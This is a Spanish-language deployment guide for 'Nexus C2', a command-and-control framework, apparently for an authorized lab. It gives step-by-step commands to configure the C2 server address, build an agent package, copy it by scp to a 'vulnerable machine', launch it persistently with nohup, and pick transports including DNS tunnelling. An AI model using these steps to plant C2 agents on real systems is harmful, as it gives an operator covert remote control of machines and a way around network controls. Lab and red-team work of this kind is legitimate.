# Despliegue del Agente Nexus C2

Guía paso a paso para instalar el agente en una máquina vulnerable dentro del entorno de laboratorio autorizado.

---

## Visión general del flujo

```
TU LAPTOP (servidor C2)                  MÁQUINA VULNERABLE
────────────────────────                 ──────────────────
1. Edita deploy/config.env               
2. Inicia el servidor C2                 
3. Genera el paquete                     
4. Copia el paquete          ──scp──►   5. Ejecuta ./install.sh
5. Abre el panel web                        ↓ agente conectado ✓
```

---

## Paso 1 — Editar la configuración

Abre el archivo `deploy/config.env` y pon la IP de tu laptop:

```bash
# deploy/config.env
NEXUS_SERVER=http://192.168.1.57:8080   ← tu IP aquí
NEXUS_TRANSPORT=http
```

Para saber tu IP:
```bash
ip addr show | grep "inet " | grep -v 127.0.0.1
```

> Solo haces este paso una vez. Si cambias de red, actualiza la IP y repite desde el paso 3.

---

## Paso 2 — Iniciar el servidor C2

```bash
python3 -m server
```

Salida esperada:
```
16:35:22 [nexus.server] server key loaded from server_key.bin
16:35:22 [nexus.server] server pub=c9f59a76a41557f7...
16:35:22 [nexus.server] DNS tunnel listening on UDP :5354
```

Deja esta terminal abierta.

---

## Paso 3 — Generar el paquete del agente

En una nueva terminal, desde la raíz del repositorio:

```bash
chmod +x deploy/build_package.sh
./deploy/build_package.sh
```

Salida esperada:
```
============================================
  Nexus C2 — Construyendo paquete agente
  Servidor : http://192.168.1.57:8080
  Transporte: http
============================================

[+] Paquete listo en: /ruta/nexus-agent

Siguiente paso — copiar a la máquina vulnerable:
   scp -r nexus-agent/ pi@<IP_MAQUINA>:~/nexus-agent
```

El paquete generado contiene todo lo necesario:
```
nexus-agent/
├── agent/          ← código del agente y plugins
├── protocol.py     ← protocolo de comunicación
├── server_pub.hex  ← clave del servidor (anti-MITM)
├── config.env      ← configuración ya embedida
├── requirements.txt
└── install.sh      ← script de instalación
```

---

## Paso 4 — Copiar el paquete a la máquina vulnerable

```bash
# Reemplaza pi@192.168.1.X con el usuario e IP de la máquina vulnerable
scp -r nexus-agent/ pi@192.168.1.X:~/nexus-agent
```

---

## Paso 5 — Instalar y ejecutar el agente

Conéctate a la máquina vulnerable:
```bash
ssh pi@192.168.1.X
```

Ejecuta el instalador:
```bash
cd ~/nexus-agent
chmod +x install.sh
./install.sh
```

El script automáticamente:
- Verifica que Python 3 esté instalado
- Crea un entorno virtual aislado
- Instala todas las dependencias
- Lee la configuración del `config.env`
- Lanza el agente

Salida esperada:
```
============================================
  Nexus C2 — Instalación del Agente
============================================

[+] Servidor C2 : http://192.168.1.57:8080
[+] Transporte  : http
[+] Python: Python 3.11.2
[*] Creando entorno virtual...
[*] Instalando dependencias...
[+] Dependencias instaladas
[+] Clave del servidor : c9f59a76a41557f7...

============================================
  Agente iniciando — Ctrl+C para detener
============================================

[nexus.agent] handshake (attempt 1)...
[nexus.agent] session=dfc46e07 transport=http
[nexus.agent] NOP
```

---

## Paso 6 — Verificar en el panel

En tu laptop, abre el navegador en:
```
http://localhost:8080
```

La máquina vulnerable debe aparecer en la lista con estado **online**.

---

## Ejecutar el agente en segundo plano

Para que el agente siga corriendo aunque cierres la terminal SSH:

```bash
nohup ./install.sh > agente.log 2>&1 &
echo "Agente corriendo. PID=$!"
```

Ver el log:
```bash
tail -f agente.log
```

---

## Transportes disponibles

Configura en `deploy/config.env` antes de generar el paquete:

| Transporte | Cuándo usarlo |
|-----------|---------------|
| `http` | Default. Funciona en cualquier red |
| `ws` | Menor latencia, conexión persistente |
| `dns` | Solo puerto 53/UDP disponible — tunnel DNS |

---

## Solución de problemas

| Síntoma | Causa | Solución |
|---------|-------|---------|
| `config.env no encontrado` | Paquete mal generado | Corre `build_package.sh` de nuevo |
| `Connection refused` | Servidor no activo o IP incorrecta | Verifica `deploy/config.env` e inicia el servidor |
| `Server public key mismatch` | Servidor reiniciado con nueva clave | Corre `build_package.sh` de nuevo y recopia el paquete |
| `ModuleNotFoundError` | Venv corrupto | Borra `.venv/` y corre `install.sh` de nuevo |
| No aparece en el panel | Firewall bloqueando puerto 8080 | Abre el puerto o cambia de transporte |

---

## Actualizar solo la clave pública

Si reiniciaste el servidor y no quieres copiar todo el paquete de nuevo:

```bash
# En tu laptop
scp server_pub.hex pi@192.168.1.X:~/nexus-agent/server_pub.hex
```

Luego reinicia el agente en la máquina vulnerada.
